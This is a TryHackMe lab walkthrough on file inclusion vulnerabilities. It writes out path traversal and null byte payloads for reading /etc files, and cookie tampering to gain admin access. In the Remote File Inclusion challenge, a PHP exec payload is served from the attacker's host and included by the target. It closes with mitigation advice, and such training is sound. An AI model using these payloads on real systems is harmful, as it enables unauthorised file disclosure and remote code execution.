TryHackMe - File Inclusion Walkthrough
======================================

This walkthrough documents my approach and solutions to the File Inclusion room on TryHackMe:  
https://tryhackme.com/room/fileinc

Overview
--------

The room introduces concepts around Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities. It emphasizes techniques like input tampering, bypassing filters, and understanding how web applications handle file loading mechanisms.

Make sure the attached VM is running and visit:  
http://10.10.68.207/challenges/index.php

General LFI Testing Methodology
-------------------------------
1. Find entry points in GET, POST, COOKIE, or HTTP header values.
2. Test with valid inputs to understand baseline behavior.
3. Send invalid/suspicious inputs (e.g. ../../../../etc/passwd) to probe for weaknesses.
4. Use external tools like Burp Suite to inspect and modify raw requests.
5. Look for error messages or behavior changes that reveal file paths or vulnerabilities.
6. Understand and bypass filters, like NULL byte injection (%00) or filename extension restrictions.

Challenge 1: Basic LFI via POST Parameter
-----------------------------------------
- The page says: "The input form is broken! You need to send POST request with file parameter!"
- What I did:
    - Inspected the page and modified the form to use POST:
      <form action="#" method="POST">
    - Submitted the value: ../../../../etc/flag1
    - Flag1 printed on screen.

Challenge 2: Cookie-Based LFI + NULL Byte Injection
----------------------------------------------------
- Initial screen says: "Welcome Guest! Only admins can access this page!"
- What I did:
    - Opened browser dev tools → Storage tab → Cookies
    - Changed cookie value from Guest to Admin
    - Page changed but included a file called Admin
    - Changed the cookie to: ../../../../etc/flag2%00
    - Flag2 displayed.

Challenge 3: POST-Based LFI with Filtering Bypass
-------------------------------------------------
- Page looks like a normal input form.
- What I tried:
    - Changed form to POST (like Challenge 1)
    - Tried path traversal with NULL byte: ../../../../etc/flag3%00
    - Didn’t work via browser, so I used Burp Suite Interceptor
    - Modified request method to POST and resent payload
    - Burp Suite bypassed the include logic and revealed Flag3

Challenge 4: Remote File Inclusion (RFI)
----------------------------------------
- Navigated to: http://10.10.68.207/playground.php
- Setup:
    - Ran local Python server: python3 -m http.server
    - Created host.txt:
        <?php
        print exec('hostname');
        ?>
    - Loaded via browser:
      http://10.10.68.207/playground.php?file=http://10.10.44.82:8000/host.txt
    - Flag printed to screen via RFI.

Detection, Mitigation, and Prevention of File Inclusion
--------------------------------------------------------

Detection:
- Monitor for suspicious file access patterns (e.g. ../, .php, remote URLs).
- Look for anomalous requests with odd user-agent or cookies.
- Set up WAF rules to catch common LFI/RFI payloads.

Mitigation:
- Never include files based on user input.
- Whitelist allowed filenames or use strict mappings instead.
- Disable remote URL includes in PHP (allow_url_include = Off).

Prevention:
- Use secure coding practices—avoid include($_GET['file']) or similar.
- Sanitize all input using allowlists and strict validation.
- Keep error messages generic to avoid exposing paths.

Flags Captured
--------------
[x] Flag1  
[x] Flag2  
[x] Flag3  
[x] Final RFI Challenge Flag
